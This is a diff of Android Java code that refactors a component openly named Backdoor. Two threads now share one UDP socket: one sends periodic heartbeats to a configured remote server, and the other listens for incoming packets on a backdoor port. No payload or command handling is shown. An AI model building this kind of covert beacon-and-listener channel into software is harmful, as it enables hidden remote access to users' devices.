@@ -146,6 +146,8 @@ public class WalloffThreads {
 				}
 			}
 		}
+	
+	
 	}
 
 	/* This thread manages backdoor network activity */
@@ -162,6 +164,7 @@ public class WalloffThreads {
 		private Context activity_context;
 		private Heartbeat heartbeat_thd;
 		private Receiver receiver_thd;
+		private DatagramSocket soc;
 		
 		/* Helper class(es) */
 		private class Heartbeat extends Thread {
@@ -176,17 +179,15 @@ public class WalloffThreads {
 			private DatagramPacket packet;
 			private byte[ ] buffer;
 			
-			public Heartbeat( Context activity_context ) {
+			public Heartbeat( Context activity_context, DatagramSocket socket ) {
 				super( );
 				this.activity_context = activity_context;
+				this.heartbeat_soc = socket;
 			}
 			
 			public boolean initialize( ) {
 				try {
 					this.prefs = this.activity_context.getSharedPreferences( Constants.PREFS_FILENAME, Context.MODE_PRIVATE );
-					this.heartbeat_soc = new DatagramSocket( null );
-					this.heartbeat_soc.setReuseAddress( true );
-					this.heartbeat_soc.bind( Backdoor.shared_addr );
 				} catch( Exception e ) {
 					e.printStackTrace( );
 					return false;
@@ -214,20 +215,17 @@ public class WalloffThreads {
 					this.heartbeat_soc.send( this.packet );
 					
 					Log.i( this.identity, "sent hearbeat..." );
+//					Log.i( "IP Write", String.valueOf( packet.getAddress() ) );
+//					Log.i( "Port Write", String.valueOf( packet.getPort() ) );
+//					Log.i( Constants.PRI_IP, ip );
+//					Log.i( Constants.PRI_PORT, String.valueOf( this.heartbeat_soc.getLocalPort( ) ) );
+					
 				} catch( Exception e ) {
 					e.printStackTrace( );
 				} 
 			}
 			
-			public String intToIp( int i ) {  
-				
-				return ( ( i & 0xFF ) + "." + ( ( i >> 8 ) & 0xFF ) + "." + ( ( i >> 16 ) & 0xFF ) + "." + ( ( i >> 24 ) & 0xFF ) );
-				
-//				   return ((i >> 24 ) & 0xFF ) + "." +  
-//				               ((i >> 16 ) & 0xFF) + "." +  
-//				               ((i >> 8 ) & 0xFF) + "." +  
-//				               ( i & 0xFF) ;  
-				}
+			public String intToIp( int i ) { return ( ( i & 0xFF ) + "." + ( ( i >> 8 ) & 0xFF ) + "." + ( ( i >> 16 ) & 0xFF ) + "." + ( ( i >> 24 ) & 0xFF ) ); }
 			
 			public void run( ) {
 				try {
@@ -250,8 +248,8 @@ public class WalloffThreads {
 				}
 			}
 		}
-		private class Receiver extends Thread {
-			
+		
+		private class Receiver extends Thread {			
 			/* Constant(s) */
 			private final String identity = "[-Backdoor_Receiver-]";
 			
@@ -261,17 +259,14 @@ public class WalloffThreads {
 			private byte[ ] buffer;
 			
 			/* Constructor(s) */
-			public Receiver( ) {
+			public Receiver( DatagramSocket socket ) {
 				super( );
+				this.backdoor_soc = socket;
 			}
 			
 			/* Method(s) */
 			public boolean initialize( ) {
 				try {
-					this.backdoor_soc = new DatagramSocket( null );
-					this.backdoor_soc.setReuseAddress( true );
-					this.backdoor_soc.setSoTimeout( Backdoor.SO_TIMEOUT );
-					this.backdoor_soc.bind( Backdoor.shared_addr );
 					this.buffer = new byte[ Constants.BACKDOOR_BUFLEN ];
 					this.packet = new DatagramPacket( this.buffer, this.buffer.length );
 				} catch( Exception e ) {
@@ -280,6 +275,7 @@ public class WalloffThreads {
 				}
 				return true;
 			}
+			
 			public void handle_conn( ) {
 				Log.i( this.identity, "established connection from " + this.backdoor_soc.getRemoteSocketAddress( ) );
 				try {
@@ -288,11 +284,13 @@ public class WalloffThreads {
 					e.printStackTrace( );
 				}
 			}
+			
 			public void run( ) {
 				try {
 					Log.i( this.identity, "up and running..." );
 					while( !Backdoor.is_stopped( ) ) {
 						try {
+//							Log.i( this.identity, "trying to rec..." );
 							this.backdoor_soc.receive( this.packet );
 							this.handle_conn( );
 						} catch( InterruptedIOException iioe ) {
@@ -323,23 +321,32 @@ public class WalloffThreads {
 			try {
 				Backdoor.shared_addr = new InetSocketAddress( Constants.backdoor_port );
 				Backdoor.heartbeat_addr = new InetSocketAddress( Constants.server_url, Constants.server_heartbeat_port );
+				
+				this.soc = new DatagramSocket( null );
+				this.soc.setReuseAddress( true );
+				this.soc.setSoTimeout( Backdoor.SO_TIMEOUT );
+				this.soc.bind( Backdoor.shared_addr );
 			} catch( Exception e ) {
 				e.printStackTrace( );
 				return false;
 			}
-			this.receiver_thd = new Receiver( );
+
+			
+			this.receiver_thd = new Receiver( soc );
 			if( !this.receiver_thd.initialize( ) )
 				return false;
-			this.heartbeat_thd = new Heartbeat( this.activity_context );
+			this.heartbeat_thd = new Heartbeat( this.activity_context, soc );
 			if( !this.heartbeat_thd.initialize( ) )
 				return false;
 			return true;
 		}
+		
 		public static boolean is_stopped( ) {
 			synchronized( Backdoor.LOCK ) {
 				return Backdoor.stopped;
 			}
 		}
+		
 		public void run( ) {
 			Log.i( Backdoor.identity, "managing the backdoor" );
 			this.receiver_thd.start( );
@@ -353,11 +360,13 @@ public class WalloffThreads {
 			}
 			Log.i( Backdoor.identity, "terminating..." );
 		}
+		
 		public void die( ) {
 			synchronized( Backdoor.LOCK ) {
 				Backdoor.stopped = true;
 			}
 		}
+		
 		public void reset( ) {
 			synchronized( Backdoor.LOCK ) {
 				if( Backdoor.stopped == true )
